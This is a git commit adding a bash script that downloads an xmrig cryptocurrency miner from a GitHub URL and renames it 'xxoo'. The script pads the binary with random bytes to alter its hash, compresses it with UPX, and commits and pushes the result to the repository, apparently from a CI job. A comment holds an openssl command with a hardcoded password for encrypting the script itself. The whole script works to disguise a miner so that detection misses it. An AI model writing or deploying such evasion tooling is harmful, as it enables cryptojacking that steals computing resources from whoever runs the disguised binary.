f5bea7e669b10bca982a08d9a7e353c4812b9b02
root <root@localhost.localdomain>
2025-04-29 23:30:50 +0800

    init project

---
+++ obfuscated_xxoo.sh
@@ -0,0 +1,30 @@
+#!/bin/bash
+
+#cat obfuscated_xxoo.sh | openssl enc -aes-256-cbc -base64 -A -salt -pbkdf2 -pass pass:7uhfudnfud909~~23
+
+rm -rf xmrig-personal-shoguncao-6.22.2.tar.gz
+rm -rf xmrig-personal-shoguncao-6.22.2
+wget https://github.com/shoguncao/CDN/raw/xmrig/xmrig/xmrig-personal-shoguncao-6.22.2.tar.gz
+tar -xvf xmrig-personal-shoguncao-6.22.2.tar.gz
+mv xmrig-personal-shoguncao-6.22.2/xmrig xxoo
+rm -rf xmrig-personal-shoguncao-6.22.2.tar.gz
+rm -rf xmrig-personal-shoguncao-6.22.2
+
+dd if=/dev/urandom of=padding.bin bs=1 count=512
+cat xxoo padding.bin > tmp_xxoo
+chmod +x tmp_xxoo
+upx --best -o obfuscated_xxoo tmp_xxoo
+mv obfuscated_xxoo xxoo_1
+rm -rf padding.bin
+rm -rf tmp_xxoo
+
+rm -rf xxoo
+
+git config --global user.email ${GITHUB_REPOSITORY_OWNER}@outlook.com
+git config --global user.name ${GITHUB_REPOSITORY_OWNER}
+git add -- .
+git commit -m "add xxoo"
+git push
+
+exit 0
+
